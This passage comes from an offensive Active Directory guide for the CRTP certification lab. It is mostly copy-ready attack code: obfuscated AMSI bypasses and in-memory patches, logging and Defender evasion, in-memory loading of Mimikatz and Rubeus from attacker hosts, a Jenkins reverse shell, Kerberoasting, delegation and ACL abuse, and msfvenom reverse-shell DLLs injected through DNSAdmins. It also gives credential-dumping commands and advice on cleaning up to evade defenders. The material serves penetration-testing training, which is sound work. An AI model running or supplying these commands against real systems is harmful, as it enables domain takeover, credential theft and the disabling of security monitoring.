"{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')
)
)."g`etf`iElD"(
("{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')),
("{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,')
)."sE`T`VaLUE"( ${n`ULl},${t`RuE} )

# ── BYPASS 2: Simple patch (works in many environments) ──────────────────
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# ── BYPASS 3: Downgrade to PS v2 (disables many security features) ────────
powershell -version 2 -exec bypass -c "..."
# Note: PS v2 doesn't support AMSI, Script Block Logging, or Module Logging

# ── BYPASS 4: Memory patch via P/Invoke ───────────────────────────────────
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static')
$c=$b.GetValue($null)
[Runtime.InteropServices.Marshal]::WriteInt32([IntPtr]$c,0x41414141)

# ── BYPASS 5: Forcing an error in amsiInitFailed ─────────────────────────
$ZQCUW = @"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $ZQCUW
$BBMN=$False
[Int32[]]$KYFL=@(0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
$URDNXQAS=[ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldeCode('&#97;&#109;&#115;&#105;&#46;&#100;&#108;&#108;'))")
$FLKRMX=[ZQCUW]::GetProcAddress($URDNXQAS,"$([systeM.neT.webUtility]::HtMldEcOde('&#65;&#109;&#115;&#105;&#83;&#99;&#97;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
$p = 0
[ZQCUW]::VirtualProtect($FLKRMX, [uint32]6, 0x40, [ref]$p)
$NNDNDJ=[System.Runtime.InteropServices.Marshal]::Copy($KYFL, 0, $FLKRMX, 6)
```

### Bypassing Script Block Logging

```powershell
# Use Invisi-Shell (recommended — see Module 00)

# Manual: disable via registry (needs admin)
Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0

# Downgrade to PS v2 (no script block logging)
powershell.exe -version 2

# Check current logging status
Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

### Bypassing Constrained Language Mode (CLM)

```powershell
# Check current language mode
$ExecutionContext.SessionState.LanguageMode
# FullLanguage = unrestricted
# ConstrainedLanguage = restricted (can't use .NET, reflection, etc.)

# CLM is usually enforced via AppLocker or WDAC

# Bypass methods:
# 1. Use tools that run in their own runspace
# 2. Use PSExec or WMI to spawn new process
# 3. Load a custom PS host
# 4. Use Win32 API via C# assembly (runs in CLR, not CLM)

# Check if AppLocker is configured:
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# If CLM is enforced, still usable:
# - cmd.exe built-ins
# - .NET CLR methods that don't need FullLanguage
# - Rubeus (standalone .NET binary — not affected by CLM)
# - SharpHound (standalone binary)
```

### Bypassing Execution Policy

```powershell
# Execution policy is NOT a security boundary — trivially bypassed:

powershell -ExecutionPolicy Bypass -File script.ps1
powershell -exec bypass -c "IEX(Get-Content script.ps1 | Out-String)"
Set-ExecutionPolicy Bypass -Scope Process
Get-Content script.ps1 | powershell -noprofile -

# Read file with bypass:
Invoke-Expression (Get-Content script.ps1 -Raw)
```

---

## 05 Offensive .NET Tradecraft

### Why .NET Tools?

```
PowerShell scripts → detected by AMSI, Script Block Logging
.NET assemblies   → run in CLR, bypass many PS-level detections
                    harder to detect, work in CLM environments
                    can be loaded in-memory (never touch disk)
```

### In-Memory .NET Loading

```powershell
# Load .NET assembly from URL directly into memory (never touches disk):
$bytes = (New-Object Net.WebClient).DownloadData('http://<LHOST>/Rubeus.exe')
$assembly = [System.Reflection.Assembly]::Load($bytes)
[Rubeus.Program]::Main("kerberoast /outfile:kerb.hash".Split())

# Generic loader for any .NET tool:
$data = (New-Object System.Net.WebClient).DownloadData('http://<LHOST>/tool.exe')
$assem = [System.Reflection.Assembly]::Load($data)
$assem.EntryPoint.Invoke($null, @([string[]]@("arg1","arg2")))
```

### SafetyKatz (Mimikatz .NET Port)

```powershell
# SafetyKatz = Mimikatz compiled as .NET assembly — evades Defender better
# Load from memory:
$bytes = (New-Object Net.WebClient).DownloadData('http://<LHOST>/SafetyKatz.exe')
[System.Reflection.Assembly]::Load($bytes)

# Or run directly:
.\SafetyKatz.exe "sekurlsa::logonpasswords" "exit"
.\SafetyKatz.exe "sekurlsa::ekeys" "exit"
.\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"

# Using AES256 for overpass-the-hash (more OpSec friendly):
.\SafetyKatz.exe "sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /aes256:<AES256_HASH> /run:cmd.exe" "exit"
```

### Modifying Tools to Bypass Defender

```
Key principle: Defender uses YARA signatures on specific strings.
Change these strings in source code or binary, and the tool won't be detected.

Common bypasses:
1. Rename functions  : amsiInitFailed → amsiBlocked
2. Change strings    : "Mimikatz" → "M1m1k4tz"  
3. String encryption : Encrypt constants, decrypt at runtime
4. Obfuscate         : Use tools like Invoke-Obfuscation
5. Compile yourself  : Recompile with modified class/method names
6. Fork & modify     : Fork the GitHub repo, change identifiable strings

CRTP provides pre-modified versions of tools in C:\AD\Tools\
Always use those — they are already bypassed for the lab environment.
```

---

## 06 Local Privilege Escalation

> CRTP is an assumed breach scenario — but sometimes you need to escalate
> on your local machine before moving to other hosts.

### PowerUp — Automated Privesc Discovery

```powershell
# Load PowerUp
. C:\AD\Tools\PowerUp.ps1

# Run all checks:
Invoke-AllChecks

# PowerUp checks for:
# - Unquoted service paths
# - Modifiable service binaries
# - Modifiable service registry keys
# - Writable program directories
# - AlwaysInstallElevated
# - Token privileges
# - Autologon credentials in registry
```

### Service Misconfigurations

```powershell
# ── Unquoted Service Path ────────────────────────────────────────────────
Get-ServiceUnquoted -Verbose
# Creates: Write-ServiceBinary -Name '<SVC>' -Path 'C:\Program Files\Vuln.exe'

# ── Modifiable Service Binary ─────────────────────────────────────────────
Get-ModifiableServiceFile -Verbose
Write-ServiceBinary -Name 'AbyssWebServer' -UserName 'dcorp\student1'

# ── Modifiable Service Config ─────────────────────────────────────────────
Get-ModifiableService -Verbose
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student1'

# ── AlwaysInstallElevated ─────────────────────────────────────────────────
# Check if enabled:
Get-RegistryAlwaysInstallElevated
# Exploit:
Write-UserAddMSI    # Creates an MSI that adds a user
msiexec /quiet /qn /i UserAdd.msi
```

### Enterprise Application Abuse (Jenkins)

```
In CRTP labs, Jenkins is commonly deployed without authentication
or with weak credentials. This is the most common initial escalation path.

Attack path:
1. Enumerate HTTP services on domain machines
2. Find Jenkins running on high port (e.g., 8080)
3. Access Jenkins console
4. Execute commands via Jenkins Script Console (Groovy):
```

```groovy
// Jenkins Script Console — Execute OS commands:
def cmd = "whoami"
def proc = cmd.execute()
proc.waitFor()
println proc.text

// Reverse shell via Jenkins:
def process = ['cmd.exe', '/c', 'powershell -enc <BASE64_PAYLOAD>'].execute()
process.waitFor()
```

```powershell
# After getting local admin via Jenkins:
# Dump local credentials, check for reused passwords in the domain

# Using Invoke-Mimikatz or SafetyKatz:
.\SafetyKatz.exe "sekurlsa::logonpasswords" "exit"

# This often reveals a svcadmin or domain admin credential!
```

---

## 07 Lateral Movement

### PowerShell Remoting (Most Used in CRTP)

```powershell
# ── One-to-one interactive session ────────────────────────────────────────
Enter-PSSession -ComputerName dcorp-adminsrv
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local

# With credentials:
$cred = Get-Credential
Enter-PSSession -ComputerName dcorp-adminsrv -Credential $cred

# ── Execute command on remote machine ──────────────────────────────────────
Invoke-Command -ComputerName dcorp-adminsrv -ScriptBlock {whoami; hostname; ipconfig}
Invoke-Command -ComputerName dcorp-adminsrv -Credential $cred -ScriptBlock {whoami}

# Run script remotely (load file into remote session):
Invoke-Command -ComputerName dcorp-adminsrv -FilePath C:\AD\Tools\PowerView.ps1
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName dcorp-adminsrv

# ── PSSession (persistent, more versatile) ────────────────────────────────
$sess = New-PSSession -ComputerName dcorp-adminsrv
$sess = New-PSSession -ComputerName dcorp-adminsrv -Credential $cred

# Execute in session:
Invoke-Command -Session $sess -ScriptBlock {whoami}
Enter-PSSession -Session $sess

# Load script into remote session:
Invoke-Command -Session $sess -FilePath C:\AD\Tools\Invoke-Mimikatz.ps1
Invoke-Command -Session $sess -ScriptBlock {Invoke-Mimikatz}

# ── AMSI bypass BEFORE loading tools into remote session ──────────────────
Invoke-Command -Session $sess -ScriptBlock {
    S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) (
    [TYpE]( "{1}{0}"-F'F','rE' ) );
    ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"((
    "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')
    ))."g`etf`iElD"(
    ("{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')),
    ("{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,')
    )."sE`T`VaLUE"($null,$true)
}

# ── Pivot: create PSSession through a hop ─────────────────────────────────
# Access machine2 via machine1 as a hop:
$hop = New-PSSession -ComputerName dcorp-adminsrv
Invoke-Command -Session $hop -ScriptBlock {
    $s2 = New-PSSession -ComputerName dcorp-mgmt
    Invoke-Command -Session $s2 -ScriptBlock { whoami }
}
```

### WMI Lateral Movement

```powershell
# Execute command via WMI
Invoke-WmiMethod -Class Win32_Process -Name Create `
  -ArgumentList "powershell.exe -enc <B64>" `
  -ComputerName dcorp-adminsrv

# With credentials:
$cred = New-Object System.Management.Automation.PSCredential("dcorp\svcadmin", (ConvertTo-SecureString "password" -AsPlainText -Force))
Invoke-WmiMethod -Class Win32_Process -Name Create `
  -ArgumentList "cmd.exe /c whoami > C:\output.txt" `
  -ComputerName dcorp-adminsrv -Credential $cred

# wmic (classic):
wmic /node:dcorp-adminsrv /user:dcorp\svcadmin /password:pass process call create "cmd.exe /c whoami > C:\out.txt"
```

### Pass-the-Hash (Lateral Movement)

```powershell
# Overpass-the-Hash with SafetyKatz (spawn process with hash):
.\SafetyKatz.exe "sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /aes256:<AES256> /run:cmd.exe" "exit"

# Spawn PowerShell with DA hash:
.\SafetyKatz.exe "sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:<NTLM> /run:powershell.exe" "exit"
# In new window: Enter-PSSession -ComputerName dcorp-dc

# Rubeus overpass-the-hash:
.\Rubeus.exe asktgt /user:svcadmin /aes256:<AES256_HASH> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

# Pass-the-Ticket:
.\Rubeus.exe ptt /ticket:<base64_ticket>

# Copy ticket from file:
.\Rubeus.exe ptt /ticket:svcadmin.kirbi
```

---

## 08 Domain Privilege Escalation — Kerberoasting

### Understanding Kerberoasting

```
╔══════════════════════════════════════════════════════════════╗
║  ANY domain user can request a TGS (service ticket)         ║
║  for ANY SPN registered in the domain.                      ║
║                                                             ║
║  TGS tickets are encrypted with the service account's       ║
║  NTLM hash → crack offline to get plaintext password.       ║
║                                                             ║
║  No special privileges required to perform this attack.     ║
╚══════════════════════════════════════════════════════════════╝

SPN Format: ServiceClass/Host:Port/ServiceName
Example:    MSSQLSvc/dcorp-mssql.dollarcorp.moneycorp.local:1433
```

### Find Kerberoastable Users

```powershell
# PowerView
Get-DomainUser -SPN | select samaccountname, serviceprincipalname, description

# AD Module
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | `
  select SamAccountName, ServicePrincipalName

# BloodHound → Analysis → List All Kerberoastable Accounts
```

### Request and Extract TGS Tickets

```powershell
# ── Method 1: PowerView (request all SPN tickets) ─────────────────────────
. C:\AD\Tools\PowerView.ps1
Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv kerb_hashes.csv -NoTypeInformation

# ── Method 2: Add-Type (native .NET request) ──────────────────────────────
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken `
  -ArgumentList "MSSQLSvc/dcorp-mssql.dollarcorp.moneycorp.local:1433"

# Export from memory:
. C:\AD\Tools\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"kerberos::list /export"'
# Creates .kirbi files — convert to hashcat format with kirbi2john or tgsrepcrack

# ── Method 3: Rubeus (best for CRTP) ──────────────────────────────────────
.\Rubeus.exe kerberoast /outfile:kerb_hashes.txt
.\Rubeus.exe kerberoast /user:svcadmin /outfile:svcadmin.hash
.\Rubeus.exe kerberoast /user:svcadmin /format:hashcat /outfile:svcadmin_hc.hash
.\Rubeus.exe kerberoast /stats        # Just show stats, don't request
.\Rubeus.exe kerberoast /rc4opsec     # Only request RC4-encrypted tickets (less noisy)
```

### Cracking Kerberoast Hashes

```bash
# On Kali — crack with Hashcat
hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt

# With rules (increase hit rate):
hashcat -m 13100 kerb_hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# John the Ripper:
john --format=krb5tgs kerb_hashes.txt --wordlist=rockyou.txt
```

### Set SPN on Account (Targeted Kerberoasting)

```powershell
# If we have GenericWrite or WriteSPN on a user, we can SET an SPN on them
# then Kerberoast them:

# Check if we can write:
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match "GenericWrite"}

# Set SPN on target user:
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/spn'}

# Verify:
Get-DomainUser -Identity targetuser | select serviceprincipalname

# Now Kerberoast them:
.\Rubeus.exe kerberoast /user:targetuser /format:hashcat /outfile:target.hash

# Clean up SPN after attack:
Set-DomainObject -Identity targetuser -Clear serviceprincipalname
```

---

## 09 Domain Privilege Escalation — AS-REP Roasting

### Understanding AS-REP Roasting

```
╔════════════════════════════════════════════════════════════════╗
║  If "Do Not Require Kerberos Preauthentication" is enabled    ║
║  on a user account, an attacker can request an AS-REP         ║
║  (Authentication Service Response) WITHOUT authenticating.    ║
║                                                               ║
║  The AS-REP contains data encrypted with the user's hash.    ║
║  Crack it offline to get the plaintext password.              ║
║                                                               ║
║  Attack requires NO credentials at all.                       ║
╚════════════════════════════════════════════════════════════════╝
```

### Find AS-REP Roastable Users

```powershell
# PowerView
Get-DomainUser -PreauthNotRequired | select samaccountname

# AD Module
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} | select SamAccountName
```

### Perform AS-REP Roasting

```powershell
# ── Rubeus (recommended) ──────────────────────────────────────────────────
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
.\Rubeus.exe asreproast /user:support1user /format:hashcat /outfile:asrep.txt

# ── PowerView ─────────────────────────────────────────────────────────────
Get-DomainUser -PreauthNotRequired | Get-ASREPHash -Format Hashcat | Out-File asrep.hash

# ── Impacket from Kali (without creds) ────────────────────────────────────
GetNPUsers.py dollarcorp.moneycorp.local/ -usersfile users.txt -no-pass -dc-ip 172.16.2.1
GetNPUsers.py dollarcorp.moneycorp.local/ -dc-ip 172.16.2.1 -request -no-pass
```

### Crack the Hash

```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
john --format=krb5asrep asrep.hash --wordlist=rockyou.txt
```

### Enable AS-REP on Account (if GenericWrite)

```powershell
# If we have GenericWrite on a user, we can disable preauthentication:
Set-DomainObject -Identity targetuser -XOR @{useraccountcontrol=4194304}

# Verify:
Get-DomainUser -Identity targetuser | select useraccountcontrol

# Perform AS-REP roast
.\Rubeus.exe asreproast /user:targetuser /format:hashcat /outfile:asrep.hash

# Re-enable preauth after attack:
Set-DomainObject -Identity targetuser -XOR @{useraccountcontrol=4194304}
```

---

## 10 Domain Privilege Escalation — Unconstrained Delegation

### Understanding Unconstrained Delegation

```
╔═══════════════════════════════════════════════════════════════╗
║  When a computer/user has Unconstrained Delegation enabled:  ║
║                                                               ║
║  ANY user that authenticates to that machine has their       ║
║  TGT (Ticket Granting Ticket) stored in LSASS memory on      ║
║  that machine.                                                ║
║                                                               ║
║  If a Domain Admin authenticates → we steal their TGT.       ║
║  → Use TGT to impersonate DA anywhere in the domain.         ║
║                                                               ║
║  Domain Controllers ALWAYS have unconstrained delegation.    ║
╚═══════════════════════════════════════════════════════════════╝

Attack flow:
1. Find machine with unconstrained delegation
2. Compromise local admin on that machine
3. Wait for/force a DA to authenticate to it
4. Extract DA's TGT from LSASS
5. Use TGT to become DA
```

### Find Machines with Unconstrained Delegation

```powershell
# PowerView
Get-DomainComputer -Unconstrained | select samaccountname, dnshostname
# Filter out DCs (they always have it):
Get-DomainComputer -Unconstrained | ?{$_.samaccountname -notmatch "DC"} | select samaccountname

# AD Module
Get-ADComputer -Filter {TrustedForDelegation -eq $True} | select Name,DNSHostName
Get-ADUser -Filter {TrustedForDelegation -eq $True} | select SamAccountName
```

### Extract TGTs from Memory

```powershell
# Assumes you have local admin on the unconstrained delegation machine
# Load Mimikatz or SafetyKatz on the target:

$sess = New-PSSession -ComputerName dcorp-adminsrv
Invoke-Command -Session $sess -ScriptBlock { Set-MpPreference -DisableRealtimeMonitoring $True }
Invoke-Command -Session $sess -FilePath C:\AD\Tools\Invoke-Mimikatz.ps1

# Check for TGTs in memory:
Invoke-Command -Session $sess -ScriptBlock {
    Invoke-Mimikatz -Command '"sekurlsa::tickets"'
}

# Export all tickets:
Invoke-Command -Session $sess -ScriptBlock {
    Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
}

# Using Rubeus to monitor for new TGTs:
.\Rubeus.exe monitor /interval:5 /nowrap
# /interval:5 = check every 5 seconds, display new TGTs as base64
```

### Force Authentication with PrintSpooler (Printer Bug)

```powershell
# MS-RPRN: Force a computer (even DC) to authenticate to our unconstrained delegation machine
# "Printer Bug" — DC sends its TGT to the machine we control

# Tool: MS-RPRN.exe (SpoolSample)
.\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-adminsrv.dollarcorp.moneycorp.local
# This forces dcorp-dc to authenticate to dcorp-adminsrv
# dcorp-dc's TGT is now cached on dcorp-adminsrv

# Monitor with Rubeus before triggering:
.\Rubeus.exe monitor /interval:5 /nowrap

# After TGT is captured (as base64 in Rubeus output), inject it:
.\Rubeus.exe ptt /ticket:<BASE64_TGT>

# Verify:
klist

# DCSync with injected DC machine account TGT:
.\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

---

## 11 Domain Privilege Escalation — Constrained Delegation

### Understanding Constrained Delegation

```
╔═══════════════════════════════════════════════════════════════╗
║  Constrained Delegation allows a service account to           ║
║  impersonate ANY user to access SPECIFIC services only.       ║
║                                                               ║
║  Attribute: msDS-AllowedToDelegateTo                         ║
║                                                               ║
║  Attack: If we control the account, we can use S4U2Self       ║
║  to get a TGS as Domain Admin for the allowed service,        ║
║  then access that service AS DA.                              ║
╚═══════════════════════════════════════════════════════════════╝

Protocol Transition (S4U):
  S4U2Self:  Get TGS for any user → your service (no password needed)
  S4U2Proxy: Present that TGS → get TGS for target service
```

### Find Accounts with Constrained Delegation

```powershell
# PowerView
Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select samaccountname, msds-allowedtodelegateto

# AD Module
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} `
  -Properties msDS-AllowedToDelegateTo | select SamAccountName, msDS-AllowedToDelegateTo
```

### Abuse Constrained Delegation (User Account)

```powershell
# Scenario: websvc has constrained delegation to CIFS/dcorp-mssql
# We have websvc's credentials (hash or password)

# Step 1: Request TGT for websvc:
.\Rubeus.exe asktgt /user:websvc /aes256:<AES256_HASH> /opsec /ptt
# OR with NTLM:
.\Rubeus.exe asktgt /user:websvc /rc4:<NTLM_HASH> /ptt

# Step 2: Use S4U to request TGS as Domain Admin for the allowed service:
.\Rubeus.exe s4u /ticket:<BASE64_TGT> /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /ptt

# Step 3: Access the service:
ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$

# ── All-in-one command ────────────────────────────────────────────────────
.\Rubeus.exe s4u /user:websvc /aes256:<AES256> /impersonateuser:Administrator `
  /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /ptt

# ── If you want HOST service (for code execution via PsExec/WMI): ─────────
.\Rubeus.exe s4u /user:websvc /aes256:<AES256> /impersonateuser:Administrator `
  /msdsspn:"cifs/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:host,rpcss /ptt

# Verify ticket injected:
klist

# Now run Invoke-Command or Enter-PSSession as DA on dcorp-mssql
```

### Abuse Constrained Delegation (Computer Account)

```powershell
# Same as above, but for a computer account
# Computer accounts end in $ (e.g., dcorp-adminsrv$)

# Get machine account hash with Mimikatz:
.\SafetyKatz.exe "sekurlsa::ekeys" "exit"

# Rubeus s4u with machine account:
.\Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:<MACHINE_AES256> `
  /impersonateuser:Administrator `
  /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /ptt

ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
```

---

## 12 Domain Privilege Escalation — Resource-Based Constrained Delegation

### Understanding RBCD

```
╔═══════════════════════════════════════════════════════════════╗
║  RBCD is controlled on the TARGET resource (not the          ║
║  delegating account).                                         ║
║                                                               ║
║  Attribute: msDS-AllowedToActOnBehalfOfOtherIdentity         ║
║  set on the TARGET computer.                                  ║
║                                                               ║
║  If we have WRITE permission on a computer object, we can     ║
║  add OUR machine account to its RBCD attribute, then          ║
║  S4U2Self as any user to access the target.                   ║
╚═══════════════════════════════════════════════════════════════╝

Requirements:
  1. GenericWrite/WriteProperty on target computer object
  2. A computer account (create one or use existing)
  3. The computer account's password hash
```

### RBCD Attack

```powershell
# Step 1: Find computer objects we have write access to:
Find-InterestingDomainAcl -ResolveGUIDs | ?{
    $_.ActiveDirectoryRights -match "GenericWrite|WriteProperty" -and
    $_.ObjectAceType -match "Computer"
}

# Step 2: Create a fake computer account (any domain user can add up to 10):
.\Powermad.ps1  # Load Powermad
New-MachineAccount -MachineAccount FakePC -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
# or via Impacket:
addcomputer.py dollarcorp.moneycorp.local/student1:password -computer-name FAKEPC -computer-pass 'Password123!'

# Get the SID of the new machine account:
Get-DomainComputer -Identity FAKEPC | select objectsid

# Step 3: Set RBCD on target machine to trust our fake computer:
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<FAKEPC_SID>)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer -Identity <TargetComputer> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Verify:
Get-DomainComputer -Identity <TargetComputer> | select msds-allowedtoactonbehalfofotheridentity

# Step 4: Get FAKEPC hash:
.\SafetyKatz.exe "sekurlsa::ekeys" "exit"
# OR use the password we set for FAKEPC:
.\Rubeus.exe hash /password:Password123! /user:FAKEPC$ /domain:dollarcorp.moneycorp.local

# Step 5: S4U as DA to target machine:
.\Rubeus.exe s4u /user:FAKEPC$ /rc4:<NTLM_HASH_OF_FAKEPC> `
  /impersonateuser:Administrator `
  /msdsspn:"cifs/<TargetComputer>.dollarcorp.moneycorp.local" /ptt

# Access target as DA:
ls \\<TargetComputer>.dollarcorp.moneycorp.local\c$
```

---

## 13 Domain Privilege Escalation — ACL Abuse

### ACL Rights Map

```
╔═══════════════════════════════════════════════════════════════╗
║  RIGHT                 WHAT YOU CAN DO                       ║
╠═══════════════════════════════════════════════════════════════╣
║  GenericAll            Full control — change password,       ║
║                        add to group, reset, delete           ║
║  GenericWrite          Write to any attribute                ║
║  WriteDACL             Modify DACL → grant yourself GenAll   ║
║  WriteOwner            Change ownership → modify DACL        ║
║  ForceChangePassword   Change password without knowing old   ║
║  AllExtendedRights     All extended rights (includes         ║
║                        DCSync, password reset)               ║
║  Self                  Write to self-write attributes        ║
║  AddMember             Add members to a group                ║
╚═══════════════════════════════════════════════════════════════╝
```

### GenericAll on User — Change Password

```powershell
# Find GenericAll on users:
Find-InterestingDomainAcl -ResolveGUIDs | ?{
    $_.ActiveDirectoryRights -eq "GenericAll" -and
    $_.ObjectAceType -eq "User"
} | select IdentityReferenceName, ObjectDN

# Exploit: Reset user's password
$UserPassword = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
Set-DomainUserPassword -Identity targetuser -AccountPassword $UserPassword
# Now log in as targetuser with NewPass123!
```

### GenericAll on Group — Add Member

```powershell
# Find GenericAll on groups:
Find-InterestingDomainAcl -ResolveGUIDs | ?{
    $_.ActiveDirectoryRights -eq "GenericAll" -and
    $_.ObjectAceType -match "Group"
}

# Exploit: Add yourself to Domain Admins:
Add-DomainGroupMember -Identity "Domain Admins" -Members student1

# Verify:
Get-DomainGroupMember -Identity "Domain Admins"
```

### WriteDACL on Domain — Grant DCSync Rights

```powershell
# If we have WriteDACL on the domain object, we can grant ourselves DCSync rights:
Add-DomainObjectAcl -TargetIdentity "dc=dollarcorp,dc=moneycorp,dc=local" `
  -PrincipalIdentity student1 `
  -Rights DCSync -Verbose

# Verify:
Get-DomainObjectAcl -TargetIdentity "dc=dollarcorp,dc=moneycorp,dc=local" `
  -ResolveGUIDs | ?{$_.IdentityReferenceName -match "student1"}

# DCSync:
.\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
.\SafetyKatz.exe "lsadump::dcsync /user:dcorp\Administrator" "exit"
```

### WriteOwner — Take Ownership then Modify DACL

```powershell
# Step 1: Take ownership of the object
Set-DomainObjectOwner -Identity targetuser -OwnerIdentity student1

# Step 2: Grant yourself GenericAll
Add-DomainObjectAcl -TargetIdentity targetuser `
  -PrincipalIdentity student1 `
  -Rights All

# Now you have GenericAll on targetuser → reset password, etc.
```

---

## 14 Domain Privilege Escalation — DNS Admins

### Understanding DNSAdmins Abuse

```
╔══════════════════════════════════════════════════════════════╗
║  Members of DNSAdmins group can configure DNS server.       ║
║                                                             ║
║  DNS server runs as SYSTEM on the Domain Controller.        ║
║                                                             ║
║  dnscmd can load a custom DLL into the DNS service.         ║
║  When DNS is restarted, the DLL executes as SYSTEM on DC.  ║
╚══════════════════════════════════════════════════════════════╝
```

### DNSAdmins Attack

```powershell
# Step 1: Check if our user is in DNSAdmins:
Get-DomainGroupMember -Identity "DNSAdmins" | select MemberName

# Step 2: Create a malicious DLL (on Kali):
msfvenom -p windows/x64/exec cmd='net group "Domain Admins" student1 /add /domain' `
  -f dll -o adduser.dll

# OR create DLL that runs reverse shell:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f dll -o shell.dll

# Step 3: Host DLL on SMB share (or copy to DC via existing access):
impacket-smbserver share . -smb2support
# OR copy to DC:
copy adduser.dll \\dcorp-dc\C$\Windows\Temp\adduser.dll

# Step 4: Configure DNS to load our DLL on next restart:
dnscmd dcorp-dc /config /serverlevelplugindll \\<ATTACKER_IP>\share\adduser.dll
# OR with copied DLL:
dnscmd dcorp-dc /config /serverlevelplugindll C:\Windows\Temp\adduser.dll

# Step 5: Restart DNS service (requires DNSAdmins membership):
sc \\dcorp-dc stop dns
sc \\dcorp-dc start dns

# After restart, DLL executes as SYSTEM on DC
# If you added student1 to DA, verify:
net group "Domain Admins" /domain

# Clean up (important for blue team evasion):
dnscmd dcorp-dc /config /serverlevelplugindll ""
sc \\dcorp-dc stop dns
sc \\dcorp-dc start dns
```

---

## 15 Credential Theft & Mimikatz

### Mimikatz / Invoke-Mimikatz

```powershell
# Load Invoke-Mimikatz (in-memory PowerShell wrapper):
iex (iwr http://<LHOST>/Invoke-Mimikatz.ps1 -UseBasicParsing)
# OR load from file:
. C:\AD\Tools\Invoke-Mimikatz.ps1

# ── Core credential dumping ────────────────────────────────────────────────
# Dump all logon sessions, NTLM hashes, and plaintext passwords:
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'

# Dump Kerberos tickets from memory:
Invoke-Mimikatz -Command '"sekurlsa::tickets"'
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'   # Save .kirbi files

# Dump encryption keys (AES256, AES128, NTLM, DES):
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'

# Dump SAM database (local accounts):
Invoke-Mimikatz -Command '"lsadump::sam"'

# Dump LSA secrets:
Invoke-Mimikatz -Command '"lsadump::secrets"'

# NTDS.dit via VSS (from DC):
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

